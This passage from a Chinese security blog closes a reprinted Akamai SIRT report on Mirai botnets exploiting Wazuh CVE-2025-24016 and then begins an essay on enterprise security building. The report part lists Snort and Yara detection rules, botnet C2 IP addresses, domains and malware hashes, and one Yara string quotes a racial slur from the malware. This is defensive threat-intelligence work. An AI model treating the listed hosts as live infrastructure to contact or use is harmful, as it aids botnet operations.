+<p>尽管 CVE 计划总体而言能造福行业，但有时候也是一把双刃剑，在曝光漏洞的同时，可能也会提醒恶意攻击者原来还有这些漏洞可供利用。</p>
+<p>研究人员创建 PoC，本意是试图向企业普及重视漏洞的重要性，却不断导致不良后果，这恰恰表明，在漏洞补丁发布后及时安装补丁是多么迫切。僵尸网络运营者会密切关注一些漏洞曝光信息，尤其是在有 PoC 代码公开的情况下，这些运营者会迅速改写这些 PoC 代码，扩大运营的僵尸网络规模。</p>
+<p>我们近期报告的漏洞只影响已停用设备，但 CVE-2025-24016 不一样，它会影响正在运行过时版本的活跃 Wazuh 服务器。我们强烈建议各企业安装包含了漏洞修复补丁的最新版本，在本文场景下，企业需安装 Wazuh 4.9.1 或更高版本。Wazuh 已发布正确保护系统安全的文档指南，如果企业遵循该指南，这类攻击活动将不足为虑。</p>
+</blockquote>
+<h2><span id="关注新动态">关注新动态</span></h2><blockquote>
+<p>Akamai SIRT 将继续监控此类威胁，并随时为我们的客户和整个安全社区报告相关情况。如需第一时间了解 SIRT 以及 Akamai 安全情报组发布的其他重要信息，请查看我们的<a target="_blank" rel="noopener" href="https://www.akamai.com/zh/security-research">研究首页</a>并关注我们的<a target="_blank" rel="noopener" href="https://x.com/akamai_research">社交媒体频道</a>。</p>
+</blockquote>
+<h2><span id="ioc">IOC</span></h2><blockquote>
+<p>为了帮助企业有效防御威胁，我们提供了相关的入侵指标 (IoC) 列表以及 Snort 和 Yara 规则。</p>
+</blockquote>
+<h3><span id="针对网络-ioc-的-snort-规则">针对网络 IoC 的 Snort 规则</span></h3><h4><span id="针对-c2-ip-的-snort-规则僵尸网络-1">针对 C2 IP 的 Snort 规则（僵尸网络 1）</span></h4><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">alert ip any any -&gt; [209.141.34.106, 176.65.142.137, 65.222.202.53, 196.251.86.49, 176.65.134.62] any (</span><br><span class="line">    msg:<span class="string">&quot;Possible Botnet C2 Infrastructure Activity - Suspicious IP&quot;</span>; </span><br><span class="line">    sid:2000001; </span><br><span class="line">    rev:1; </span><br><span class="line">    threshold:<span class="built_in">type</span> <span class="built_in">limit</span>, track by_src, count 1, seconds 600; </span><br><span class="line">    classtype:trojan-activity; </span><br><span class="line">    metadata:service http, malware;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4><span id="针对-c2-域解析检测的-snort-规则僵尸网络-1">针对 C2 域解析检测的 Snort 规则（僵尸网络 1）</span></h4><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alert http any any -&gt; [nuklearcnc.duckdns.org, jimmyudp-raw.xyz, pangacnc.com, neon.galaxias.cc, cbot.galaxias.cc] any (</span><br><span class="line">    msg:<span class="string">&quot;Possible Botnet C2 or Malware Distribution - Suspicious Domain&quot;</span>; </span><br><span class="line">    sid:2000002; rev:1; </span><br><span class="line">    classtype:trojan-activity; </span><br><span class="line">    metadata:service http, malware;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4><span id="针对-c2-ip-的-snort-规则僵尸网络-2">针对 C2 IP 的 Snort 规则（僵尸网络 2）</span></h4><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">alert ip any any -&gt; [104.168.101.27, 104.168.101.23, 79.124.40.46, 194.195.90.179] any (</span><br><span class="line">    msg:<span class="string">&quot;Possible Botnet C2 Infrastructure Activity - Suspicious IP&quot;</span>; </span><br><span class="line">    sid:2000003; </span><br><span class="line">    rev:1; </span><br><span class="line">    threshold:<span class="built_in">type</span> <span class="built_in">limit</span>, track by_src, count 1, seconds 600; </span><br><span class="line">    classtype:trojan-activity; </span><br><span class="line">    metadata:service http, malware;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4><span id="针对-c2-域解析检测的-snort-规则僵尸网络-2">针对 C2 域解析检测的 Snort 规则（僵尸网络 2）</span></h4><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alert http any any -&gt; [resbot.online, versioneonline.com, web-app-on.com, assicurati-con-linear.online, webdiskwebdisk.webprocediweb.com, continueoraweb.com, ora-0-web.com, adesso-online.com, multi-canale.com, eversioneweb.com, gestisciweb.com] any (</span><br><span class="line">    msg:<span class="string">&quot;Possible Botnet C2 or Malware Distribution - Suspicious Domain&quot;</span>; </span><br><span class="line">    sid:2000004; rev:1; </span><br><span class="line">    classtype:trojan-activity; </span><br><span class="line">    metadata:service http, malware;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="针对恶意软件样本的-yara-规则僵尸网络-1">针对恶意软件样本的 Yara 规则（僵尸网络 1）</span></h3><blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">rule Mirai_Malware_IOCs_1</span><br><span class="line">&#123;</span><br><span class="line">    meta:</span><br><span class="line">        description = &quot;Detects files containing IOCs associated with potential Mirai malware&quot;</span><br><span class="line">        author = &quot;Akamai SIRT&quot;</span><br><span class="line">        date = &quot;2025-05-16&quot;</span><br><span class="line">        source = &quot;Akamai SIRT&quot;</span><br><span class="line">        malware_family = &quot;Mirai&quot;</span><br><span class="line">        version = &quot;1.0&quot;</span><br><span class="line"></span><br><span class="line">    strings:</span><br><span class="line">        $lzrd = &quot;LZRD&quot;</span><br><span class="line">        $fucku = &quot;fuck u nigga&quot;</span><br><span class="line">        $vega = &quot;xXxSlicexXxxVEGA&quot;</span><br><span class="line">        $we_got_this = &quot;We got this shit already&quot;</span><br><span class="line">        $katana = &quot;666V3G4-Katana999&quot;</span><br><span class="line"></span><br><span class="line">        $ip1 = &quot;209.141.34.106&quot;</span><br><span class="line">        $ip2 = &quot;176.65.142.137&quot;</span><br><span class="line">        $ip3 = &quot;65.222.202.53&quot;</span><br><span class="line">        $ip4 = &quot;196.251.86.49&quot;</span><br><span class="line">        $ip5 = “176.65.134.62”</span><br><span class="line"></span><br><span class="line">        $domain1 = &quot;nuklearcnc.duckdns.org&quot;</span><br><span class="line">        $domain2 = &quot;jimmyudp-raw.xyz&quot;</span><br><span class="line">        $domain3 = &quot;pangacnc.com&quot;</span><br><span class="line">        $domain4 = &quot;neon.galaxias.cc&quot;</span><br><span class="line">        $domain5 = &quot;cbot.galaxias.cc&quot;</span><br><span class="line"></span><br><span class="line">        $hash1 = &quot;dece5eaeb26d0ca7cea015448a809ab687e96c6182e56746da9ae4a2b16edaa9&quot;</span><br><span class="line">        $hash2 = &quot;7b659210c509058bd5649881f18b21b645acb42f56384cbd6dcb8d16e5aa0549&quot;</span><br><span class="line">        $hash3 = &quot;64bd7003f58ac501c7c97f24778a0b8f412481776ab4e6d0e4eb692b08f52b0f&quot;</span><br><span class="line">        $hash4 = &quot;4c1e54067911aeb5aa8d1b747f35fdcdfdf4837cad60331e58a7bbb849ca9eed&quot;</span><br><span class="line">        $hash5 = &quot;811cd6ebeb9e2b7438ad9d7c382db13c1c04b7d520495261093af51797f5d4cc&quot;</span><br><span class="line">        $hash6 = &quot;90df78db1fb5aea6e21c3daca79cc690900ef8a779de61d5b3c0db030f4b4353&quot;</span><br><span class="line">        $hash7 = &quot;8a58fa790fc3054c5a13f1e4e1fcb0e1167dbfb5e889b7c543d3cdd9495e9ad6&quot;</span><br><span class="line">        $hash8 = &quot;c9df0a2f377ffab37ede8f2b12a776a7ae40fa8a6b4724d5c1898e8e865cfea1&quot;</span><br><span class="line">        $hash9 = &quot;6614545eec64c207a6cc981fccae8077eac33a79f286fc9a92582f78e2ae243a&quot;</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        (</span><br><span class="line">            $lzrd or</span><br><span class="line">            $fucku or</span><br><span class="line">            $vega or</span><br><span class="line">            $we_got_this or</span><br><span class="line">            $katana or</span><br><span class="line">            $ip1 or</span><br><span class="line">            $ip2 or</span><br><span class="line">            $ip3 or</span><br><span class="line">            $ip4 or</span><br><span class="line">            $ip5 or</span><br><span class="line">            $domain1 or</span><br><span class="line">            $domain2 or</span><br><span class="line">            $domain3 or</span><br><span class="line">            $domain4 or</span><br><span class="line">            $domain5 or</span><br><span class="line">            $hash1 or</span><br><span class="line">            $hash2 or</span><br><span class="line">            $hash3 or</span><br><span class="line">            $hash4 or</span><br><span class="line">            $hash5 or</span><br><span class="line">            $hash6 or</span><br><span class="line">            $hash7 or</span><br><span class="line">            $hash8 or</span><br><span class="line">            $hash9</span><br><span class="line">        )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="针对恶意软件样本的-yara-规则僵尸网络-2">针对恶意软件样本的 Yara 规则（僵尸网络 2）</span></h3><blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">rule Mirai_Malware_IOCs_2</span><br><span class="line">&#123;</span><br><span class="line">    meta:</span><br><span class="line">        description = &quot;Detects files containing IOCs associated with potential Mirai malware.&quot;</span><br><span class="line">        author = &quot;Akamai SIRT&quot;</span><br><span class="line">        date = &quot;2025-05-16&quot;</span><br><span class="line">        source = &quot;Akamai SIRT&quot;</span><br><span class="line">        malware_family = &quot;Mirai&quot;</span><br><span class="line">        version = &quot;1.0&quot;</span><br><span class="line"></span><br><span class="line">    strings:</span><br><span class="line">        $resentual = &quot;Resentual got you&quot;</span><br><span class="line">        $ip1 = &quot;104.168.101.27&quot;</span><br><span class="line">        $ip2 = &quot;104.168.101.23&quot;</span><br><span class="line">        $ip3 = &quot;79.124.40.46&quot;</span><br><span class="line">        $ip4 = &quot;194.195.90.179&quot;</span><br><span class="line"></span><br><span class="line">        $domain1 = &quot;resbot.online&quot;</span><br><span class="line">        $domain2 = &quot;versioneonline.com&quot;</span><br><span class="line">        $domain3 = &quot;web-app-on.com&quot;</span><br><span class="line">        $domain4 = &quot;Assicurati-con-linear.online&quot;</span><br><span class="line">        $domain5 = &quot;webdiskwebdisk.webprocediweb.com&quot;</span><br><span class="line">        $domain6 = &quot;continueoraweb.com&quot;</span><br><span class="line">        $domain7 = &quot;ora-0-web.com&quot;</span><br><span class="line">        $domain8 = &quot;adesso-online.com&quot;</span><br><span class="line">        $domain9 = &quot;multi-canale.com&quot;</span><br><span class="line">        $domain10 = &quot;eversioneweb.com&quot;</span><br><span class="line">        $domain11 = &quot;gestisciweb.com&quot;</span><br><span class="line"></span><br><span class="line">        $hash1 = &quot;9d5c10c7d0d5e2ce8bb7f1d4526439ce59108b2c631dd9e78df4e096e612837b&quot;</span><br><span class="line">        $hash2 = &quot;be4070b79a2f956e686469b37a8db1e7e090b9061d3dce73e3733db2dbe004f0&quot;</span><br><span class="line">        $hash3 = &quot;e6cf946bd5a17909ae3ed9b1362cfaafa7afe02e74699dcbc3d515a6f964b0b0&quot;</span><br><span class="line">        $hash4 = &quot;4d9f632e977b16466b72b6ee90b6de768c720148c1e337709b57ca49c1cdffb6&quot;</span><br><span class="line">        $hash5 = &quot;a0b47c781e70877ad4e721ba49f64fc0bc469e38750f070a232d12f03d9990bc&quot;</span><br><span class="line">        $hash6 = &quot;941a30698db98f29919cba80e66717c25592697b1447f3e96825730229d97549&quot;</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        (</span><br><span class="line">            $resentual or</span><br><span class="line">            $ip1 or</span><br><span class="line">            $ip2 or</span><br><span class="line">            $ip3 or</span><br><span class="line">            $ip4 or</span><br><span class="line">            $domain1 or</span><br><span class="line">            $domain2 or</span><br><span class="line">            $domain3 or</span><br><span class="line">            $domain4 or</span><br><span class="line">            $domain5 or</span><br><span class="line">            $domain6 or</span><br><span class="line">            $domain7 or</span><br><span class="line">            $domain8 or</span><br><span class="line">            $domain9 or</span><br><span class="line">            $domain10 or</span><br><span class="line">            $domain11 or</span><br><span class="line">            $hash1 or</span><br><span class="line">            $hash2 or</span><br><span class="line">            $hash3 or</span><br><span class="line">            $hash4 or</span><br><span class="line">            $hash5 or</span><br><span class="line">            $hash6</span><br><span class="line">        )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="恶意-ipv4-地址僵尸网络-1">恶意 IPv4 地址（僵尸网络 1）</span></h3><blockquote>
+<p>209.141.34.106</p>
+<p>176.65.142.137</p>
+<p>65.222.202.53</p>
+<p>196.251.86.49</p>
+<p>176.65.134.62</p>
+</blockquote>
+<h3><span id="恶意域名僵尸网络-1">恶意域名（僵尸网络 1）</span></h3><blockquote>
+<p><em>nuklearcnc.duckdns[.]org</em></p>
+<p><em>jimmyudp-raw[.]xyz</em></p>
+<p><em>pangacnc[.]com</em></p>
+<p><em>neon.galaxias[.]cc</em></p>
+<p><em>cbot.galaxias[.]cc</em></p>
+</blockquote>
+<h3><span id="恶意-ipv4-地址僵尸网络-2">恶意 IPv4 地址（僵尸网络 2）</span></h3><blockquote>
+<p>104.168.101.27</p>
+<p>104.168.101.23</p>
+<p>79.124.40.46</p>
+<p>194.195.90.179</p>
+</blockquote>
+<h3><span id="恶意域名僵尸网络-2">恶意域名（僵尸网络 2）</span></h3><blockquote>
+<p><em>resbot[.]online</em></p>
+<p><em>versioneonline[.]com</em></p>
+<p><em>web-app-on[.]com</em></p>
+<p><em>Assicurati-con-linear[.]online</em></p>
+<p><em>webdiskwebdisk.webprocediweb[.]com</em></p>
+<p><em>continueoraweb[.]com</em></p>
+<p><em>ora-0-web[.]com</em></p>
+<p><em>adesso-online[.]com</em></p>
+<p><em>multi-canale[.]com</em></p>
+<p><em>eversioneweb[.]com</em></p>
+<p><em>gestisciweb[.]com</em></p>
+</blockquote>
+<h3><span id="sha256-哈希值僵尸网络-1">SHA256 哈希值（僵尸网络 1）</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dece5eaeb26d0ca7cea015448a809ab687e96c6182e56746da9ae4a2b16edaa9</span><br><span class="line">7b659210c509058bd5649881f18b21b645acb42f56384cbd6dcb8d16e5aa0549</span><br><span class="line">64bd7003f58ac501c7c97f24778a0b8f412481776ab4e6d0e4eb692b08f52b0f</span><br><span class="line">4c1e54067911aeb5aa8d1b747f35fdcdfdf4837cad60331e58a7bbb849ca9eed</span><br><span class="line">811cd6ebeb9e2b7438ad9d7c382db13c1c04b7d520495261093af51797f5d4cc</span><br><span class="line">90df78db1fb5aea6e21c3daca79cc690900ef8a779de61d5b3c0db030f4b4353</span><br><span class="line">8a58fa790fc3054c5a13f1e4e1fcb0e1167dbfb5e889b7c543d3cdd9495e9ad6</span><br><span class="line">c9df0a2f377ffab37ede8f2b12a776a7ae40fa8a6b4724d5c1898e8e865cfea1</span><br><span class="line">6614545eec64c207a6cc981fccae8077eac33a79f286fc9a92582f78e2ae243a</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="sha256-哈希值僵尸网络-2">SHA256 哈希值（僵尸网络 2）</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">9d5c10c7d0d5e2ce8bb7f1d4526439ce59108b2c631dd9e78df4e096e612837b</span><br><span class="line">be4070b79a2f956e686469b37a8db1e7e090b9061d3dce73e3733db2dbe004f0</span><br><span class="line">e6cf946bd5a17909ae3ed9b1362cfaafa7afe02e74699dcbc3d515a6f964b0b0</span><br><span class="line">4d9f632e977b16466b72b6ee90b6de768c720148c1e337709b57ca49c1cdffb6</span><br><span class="line">a0b47c781e70877ad4e721ba49f64fc0bc469e38750f070a232d12f03d9990bc</span><br><span class="line">941a30698db98f29919cba80e66717c25592697b1447f3e96825730229d97549</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.akamai.com/blog/security-research/2025-january-new-aquabot-mirai-variant-exploiting-mitel-phones">查看更多 Mirai 相关信息</a></p>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Wazuh/" rel="tag">Wazuh</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2025/12/19/Internet-Security-Management/">
+                互联网企业安全建设思考与实践
+            </a>
+        </h2>
+    
+    <time>
+        Dec 19, 2025
+    </time>
+    <section class="content">
+        <h1><span id="互联网企业安全建设思考与实践">互联网企业安全建设思考与实践</span></h1><blockquote>
+<p>本文转自 <a target="_blank" rel="noopener" href="https://www.secrss.com/articles/26532">安全研究与实践</a> 并作补充</p>
+</blockquote>
+<blockquote>
+<p>受整个大环境的影响，无论国家还是行业层面，现在都开始逐渐关注和重视安全问题。很多互联网企业也都在招聘安全负责人和组建安全团队。越来越多的安全人员开始进入到企业安全领域。一个企业的安全建设该怎么做？思路是什么？安全的价值如何体现？如何从零开始构建一套相对完善和成熟的企业安全体系？如何衡量企业安全建设的效果？等等这些都是企业安全负责人面临的现实问题和挑战，下面我们来共同探讨下以上这些话题。</p>
+</blockquote>
+<h2><span id="一-安全与业务的关系">一、安全与业务的关系</span></h2><blockquote>
+<p>安全对企业来讲很重要，这一点毋庸置疑。但如何给不懂安全的高层讲清楚安全的价值以及安全与业务的关系呢？如果我们直接用专业术语来给对方讲，很大几率他们是听不懂的，效果自然也不会太好。这时就需要转变思路，和对方站在同一维度去考虑问题，用对方可以听懂的语言把安全与业务的关系描述清楚。</p>
+<p>如果从业务视角出发，一个企业安全的好坏可能会对公司运营与业务发展、商业竞争、品牌形象、安全合规与法律风险这几个方面产生影响。如果一个企业安全做的不好，那么就无力应对日趋复杂的网络攻击，在攻防对抗中处于被动地位，这样就会制约公司业务的正常运营和发展，到一定程度可能会成为公司发展瓶颈。安全建设和水平落后于竞争对手，在商业竞争中就会处于被动地位。安全问题频发，就会影响公司品牌形象，用户没有安全感，从而造成用户投诉和流失，这样就会带来直接和间接的经济损失。现在安全合规的趋势是越来越严格，信息安全的法律也在不断完善，如果企业在这方面做的不到位将会面临重大安全风险。相反，如果企业安全做的好的话，将会在以上这几方面产生积极和正面的影响，进一步保障和促进公司的发展。如果从以上这几方面来切入，再加上一些公司自身和行业的案例，会更容易让人理解和有说服力。</p>
+<p>这里说的安全要跑在业务前面，并不是说安全上投入的钱要多于业务。而是说要有战略眼光，在业务快速发展前提前布局和考虑可能的安全风险，安全提前介入，这样就会更加主动和可以更好的保障和促进业务的发展；如果业务与安全同步发展，基本是一个勉强保障和支撑业务发展的状态；如果安全落后于发展业务，那么问题也就很明显了，企业在安全上会完全处于被动地位，到一定程度一定会成为公司业务发展的瓶颈，甚至决定公司的生死。比如前几天一个做区块链的公司就因为黑客攻击事件宣布关闭。</p>
+<p><img src="/2025/12/19/Internet-Security-Management/1.png" alt="image"></p>
+</blockquote>
+<h2><span id="二-互联网企业安全建设整体思路">二、互联网企业安全建设整体思路</span></h2><blockquote>
+<p>互联网企业安全建设有一个基本原则，那就是目标导向，要对结果和效果负责。基于这一原则，安全建设要围绕企业核心业务、核心数据和核心资产展开。首先挖掘安全需求和明确安全目标，然后根据设定的安全目标进行分阶段的安全体系规划和建设。但是光有体系还不成，安全是一个动态的过程，所以还需要通过持续的安全运营来发现问题，不断完善和进化，达到逐步提升安全能力的目的。</p>
+<p>挖掘安全需求：</p>
+<p>在挖掘安全需求这个阶段需要搞清楚两个事情：1、知晓企业目前和未来面临的安全威胁来自哪儿，安全风险和挑战是什么？现有安全能力是什么样的；2、理解公司高层对安全的期望和诉求，这样可以保证大的安全方向不会出问题；</p>
+<p>明确安全目标：</p>
+<p>在设定安全目标时一定要合理、清晰、量化和可衡量，区分长、中、短期目标，对于目标的理解和需要投入的资源达成一致，这一点非常重要；</p>
+<p>安全规划、体系建设：</p>
+<p>安全体系中包含的内容非常多，所以我们在建设过程中一定要区分事情的紧急度和优先级，什么阶段做什么事情。而且需要获得高层的支持，否则很多事情是很难推动落地的。</p>
+<p>安全运营：</p>
+<p>安全运营是一个持续的过程，也是一种不断发现问题和总结经验的过程。</p>
+<p>持续优化和完善：</p>
+<p>最后通过持续优化和完善将安全建设形成一个完整闭环，实现良性循环。</p>
+<p><img src="/2025/12/19/Internet-Security-Management/2.png" alt="image"></p>
+</blockquote>
+<h2><span id="三-互联网企业面临安全风险与影响">三、互联网企业面临安全风险与影响</span></h2><blockquote>
+<p>在谈安全建设前，我们先来分析下互联网企业面临的安全风险以及这些风险可能造成的影响和引发的后果有哪些。可以从数据安全、业务安全、基础安全、人员安全、安全合规与法律风险五个方面来分析。其他几个方面都比较容易理解，不再多说。为什么要把人员安全单独列出来呢？因为人是整个安全体系最为薄弱、也是最不可控的环节。业界很多著名的安全事件都是因为人员安全意识薄弱导致的，所以我们要对这块给予足够的重视。尤其是人员规模大、变化快的企业更是如此。</p>
+<p>以上这些安全风险可能会导致企业大量敏感数据泄露、业务中断、系统稳定性和可用性受到影响，严重的还会成为PR事件，公司声誉、品牌受损，公信力下降，从而造成用户投诉和流失，带来直接或间接经济损失，公司市值下降，IPO受影响。不合规导致被网安、监控机构处罚，或无法正常开展业务以及与外部合作受阻等。</p>
+<p><img src="/2025/12/19/Internet-Security-Management/3.png" alt="image"></p>
+</blockquote>
+<h2><span id="四-互联网企业核心安全目标">四、互联网企业核心安全目标</span></h2><blockquote>
+<p>企业面临的安全挑战和风险分析清楚后，现在到了树立目标解决问题的时刻。虽然由于每个企业所处的发展阶段、业务特性和所属行业的不同，会导致每个企业的具体安全需求、目标的侧重点有所区别。比如同样是讲数据安全，电商和教育公司对于要保护的数据内容和关注点是有明显差异的。但是对于安全目标有很多地方是一致的，一起来看下：</p>
+<p><img src="/2025/12/19/Internet-Security-Management/4.png" alt="image"></p>
+</blockquote>
+<h2><span id="五-互联网企业核心安全能力建设">五、互联网企业核心安全能力建设</span></h2><blockquote>
+<p>要实现以上安全目标，就需要企业安全团队具备相应的安全能力。通过提炼总结，我认为一个企业安全团队应当具备五大核心安全能力：</p>
+<p>安全风险主动发现与处置能力</p>
+<p>具备主流安全风险（数据、业务、漏洞）主动发现、修复方案提供和修复推动能力</p>
+<p>安全态势感知和响应能力</p>
+<p>具备主流网络攻击、明显异常行为的主动发现和快速应急响应能力</p>
+<p>安全自动化、工程化能力</p>
+<p>自动化安全工具、系统及平台的设计、研发能力</p>
+<p>安全体系建设与运营能力</p>
+<p>安全是一个整体，同时也是一个动态和持续的过程，这就要求企业安全团队具备体系化安全建设思维、视野和格局和持续安全运营能力</p>
+<p>持续的安全研究和学习能力</p>
+<p>业界会不断出现新的漏洞、新的威胁、新的攻击手法，具备应对新攻击、威胁、漏洞的能力也至关重要</p>
+<p><img src="/2025/12/19/Internet-Security-Management/5.png" alt="image"></p>
+</blockquote>
+<h2><span id="六-互联网企业安全蓝图">六、互联网企业安全蓝图</span></h2><blockquote>
+<p>一个企业的安全未来会做成什么样子？这就需要一张安全蓝图来描述和表达，然后朝着这个方向和目标不断努力，最终实现目标。</p>
+<p>首先，从顶层安全设计说起，一个企业要有统一和明确的安全战略规划，并定期review，保证安全建设不偏离大方向；其次，要有合理、高效的安全组织架构，把安全团队放到合理的位置，这样才能更好的发挥安全团队的价值；通过持续的安全投入和制定明确合理的安全考核与激励机制，调动安全团队的积极性和促进安全团队的良性发展。最终建立一套相对完善和契合企业自身业务特性的安全体系。但是光有体系还不够，还需要通过持续的安全运营来保障整个体系有效运行。所有这些工作最终都需要有人来完成，所以要实现以上目标，还需要一只专业安全团队加上与之匹配的专业安全能力。如果光有规划，没有人或者能力不足以支撑目标的实现，那么再好的规划也只是空中楼阁。反之也是一样，如果有人，能力也很强，但是没有正确的方向指引和明确的目标，最终也只能沦为救火队员，成为不了一流的安全团队。</p>
+<p><img src="/2025/12/19/Internet-Security-Management/6.png" alt="image"></p>
+</blockquote>
+<h2><span id="七-互联网企业安全整体视角">七、互联网企业安全整体视角</span></h2><blockquote>
+<p>前面我们说到安全是一个整体，并且整个安全体系中包含的内容非常多且杂。我尝试从企业安全整体视角做了梳理，一起来看下企业安全都主要包含哪些方面和内容：</p>
+<p><img src="/2025/12/19/Internet-Security-Management/7.png" alt="image"></p>
+</blockquote>
+<h2><span id="八-如何落地实施">八、如何落地实施</span></h2><blockquote>
+<p>现在安全目标已明确，规划也有了。还有一个至关重要的问题没有解决，那就是如何将安全规划落地，并且变成一件可跟踪和量化的事情？这是一件非常有挑战，也是一件可以真正积累安全实践经验的事情。我的思路和建议是把整个安全规划中的内容先列出来，把一个大安全目标分解成多个小安全目标，然后列出打算如何实现这些安全目标，哪些安全产品打算自研，哪些需要和第三方安全厂商合作，最终依据企业目前的安全现状、现有资源以及项目优先级进行排期和实施，并定期跟进这些项目的进度，及时解决、改进整个过程中存在的问题，最终目标是建立一个相对完善的企业安全体系。这部分内容非常多，有机会单独写出来。</p>
+<p><img src="/2025/12/19/Internet-Security-Management/8.png" alt="image"></p>
+</blockquote>
+<h2><span id="九-分阶段安全体系建设">九、分阶段安全体系建设</span></h2><blockquote>
+<p>从零开始建设一个完善的企业安全体系需要做的事情很多，这并不是一件一蹴而就的事情，而是一个分阶段逐步推进的过程，是一个系统化的工程。在这个过程中企业的安全能力会逐步得到提升。我个人认为，通常一个企业的安全建设需要经历以下几个阶段：</p>
+<p><img src="/2025/12/19/Internet-Security-Management/9.png" alt="image"></p>
+<p>救火阶段</p>
+<p>这是一个企业安全从无到有必须到经历的阶段，从字面上就可以看出这个阶段安全工作比较被动，安全人员很多时候是充当救火队员的角色。这个阶段工作的核心是解决目前企业遇到最严重、优先级最高的安全问题，在这个过程中要尽快熟悉公司的环境、业务、系统架构等。此外，这个阶段还有个不小的挑战就是如何找到合适的人才组建安全团队。</p>
+<p>基础安全建设阶段</p>
